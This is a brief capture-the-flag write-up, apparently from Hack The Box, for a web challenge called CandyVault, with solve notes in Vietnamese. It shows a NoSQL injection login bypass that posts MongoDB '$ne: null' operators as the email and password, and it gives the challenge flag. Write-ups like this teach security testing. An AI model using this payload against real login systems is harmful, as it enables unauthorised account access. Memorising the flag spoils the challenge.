# Description
CandyVault
The malevolent spirits have concealed all the Halloween treats within their secret vault, and it's imperative that you decipher its enigmatic seal to reclaim the candy before the spooky night arrives.

# Source:

- [Source](./src/)
- [Zip](./web_candyvault.zip)

# Solve

- POST data với Content-Type: `application/json`
- Data gửi đi là:
```json
{
    "email": {"$ne": null},
    "password": {"$ne": null}
}
```
![Alt text](image.png)
`Flag: HTB{w3lc0m3_to0o0o_th3_c44andy_v4u1t!}`